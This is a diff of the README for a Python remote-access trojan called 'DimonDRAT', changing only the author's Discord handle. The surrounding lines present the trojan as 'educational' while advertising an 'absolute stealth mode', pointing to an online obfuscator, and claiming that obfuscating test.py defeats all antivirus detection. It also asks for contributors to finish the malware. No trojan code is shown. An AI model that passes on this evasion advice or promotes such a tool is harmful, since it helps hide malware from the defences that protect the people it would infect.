@@ -1,6 +1,6 @@
 # DimonDRAT
 # Author: SegYT
-# Discord for help: SegYT#7665
+# Discord for help: DimonDev#7665
 # Description: I developed this piece of software only for educational purposes, I wanted to improve my trojan coding skills, only to understand better the field of trojan programming.
 # License: I do not allow to make any modifications in my software and I also deny the commercial use of it, however, I allow to publish a review on YouTube about this software, but remember to credit me!
 # Installation:
@@ -29,4 +29,4 @@ Good online obfuscator: https://pyob.oxyry.com/
 9. Absolute stealth mode (You need to obfuscate the file test.py and absolutely no antivirus will detect it)
 
 Contact me on Discord if you have a problem or if you want to contribute with me to finish my software, support will be appreciated!
-My Discord: SegYT#7665
+My Discord: DimonDev#7665
